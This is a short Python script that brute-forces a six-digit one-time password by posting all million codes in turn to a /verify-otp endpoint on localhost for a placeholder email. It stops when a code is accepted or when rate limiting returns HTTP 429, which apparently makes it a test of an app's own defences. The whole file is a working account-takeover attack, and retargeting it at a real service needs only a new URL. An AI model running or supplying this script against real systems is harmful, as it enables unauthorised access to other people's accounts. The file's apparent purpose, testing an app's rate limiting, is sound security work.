import requests

URL = "http://127.0.0.1:5000/verify-otp"
EMAIL = "user@example.com"

def try_otp(otp):
    r = requests.post(URL, json={
        "email": EMAIL,
        "otp": otp
    })
    return r.status_code

for i in range(0, 1000000):
    otp = str(i).zfill(6)
    status = try_otp(otp)

    if status == 200:
        print(f"[+] VALID OTP FOUND: {otp}")
        break

    if status == 429:
        print("[!] Rate limit triggered. Attack blocked.")
        break

    if i % 50000 == 0:
        print(f"[*] Tried {i} OTPs...")
